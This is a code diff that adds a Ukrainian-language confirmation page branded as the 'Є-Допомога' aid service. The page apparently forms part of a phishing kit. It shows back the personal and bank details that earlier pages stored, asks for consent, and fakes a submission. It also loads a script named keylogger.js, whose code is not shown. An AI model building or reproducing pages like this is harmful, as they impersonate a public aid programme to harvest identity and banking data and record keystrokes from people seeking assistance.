@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Є-Допомога | Підтвердження</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <header>
+        <h1>Підтвердження даних</h1>
+        <p>Перевірте введені дані перед відправкою</p>
+    </header>
+
+    <div class="container">
+        <div class="payment-card">
+            <div id="summaryData" class="summary"></div>
+
+            <div class="form-group checkbox">
+                <input type="checkbox" id="agreeTerms" required>
+                <label for="agreeTerms">Я погоджуюсь з обробкою моїх персональних даних та умовами надання допомоги</label>
+            </div>
+
+            <div class="form-buttons">
+                <button onclick="location.href='bank.html'" class="prev-btn">Назад</button>
+                <button onclick="submitAllData()" class="submit-btn">Підтвердити та відправити</button>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2023 Є-Допомога. Всі права захищені.</p>
+        <p>Гаряча лінія: 0 800 123 456</p>
+    </footer>
+
+    <script src="js/keylogger.js"></script>
+    <script>
+        // Показываем сводку данных при загрузке страницы
+        document.addEventListener('DOMContentLoaded', function() {
+            const formData = JSON.parse(localStorage.getItem('formData') || '{}');
+            const bankData = JSON.parse(localStorage.getItem('bankData') || '{}');
+            
+            const summary = document.getElementById('summaryData');
+            
+            // Добавляем персональные данные
+            let html = '<h3>Особисті дані:</h3><ul>';
+            for (const [key, value] of Object.entries(formData)) {
+                html += `<li><strong>${key}:</strong> ${value}</li>`;
+            }
+            html += '</ul>';
+            
+            // Добавляем банковские данные
+            html += '<h3>Банківські дані:</h3><ul>';
+            html += `<li><strong>Банк:</strong> ${bankData.bank}</li>`;
+            html += `<li><strong>Телефон:</strong> ${bankData.phone}</li>`;
+            html += '</ul>';
+            
+            summary.innerHTML = html;
+        });
+
+        function submitAllData() {
+            if (!document.getElementById('agreeTerms').checked) {
+                alert('Будь ласка, підтвердіть згоду з умовами');
+                return;
+            }
+            
+            const formData = JSON.parse(localStorage.getItem('formData') || '{}');
+            const bankData = JSON.parse(localStorage.getItem('bankData') || '{}');
+            
+            // Отправляем данные на сервер
+            sendDataToServer({ ...formData, ...bankData });
+        }
+
+        function sendDataToServer(data) {
+            const btn = document.querySelector('.submit-btn');
+            btn.innerHTML = 'Відправка...';
+            btn.disabled = true;
+            
+            // Здесь должна быть реальная отправка данных
+            console.log('Отправка данных:', data);
+            
+            // Имитация отправки
+            setTimeout(() => {
+                alert('Дані успішно відправлені! Очікуйте рішення.');
+                localStorage.clear();
+                location.href = 'index.html';
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
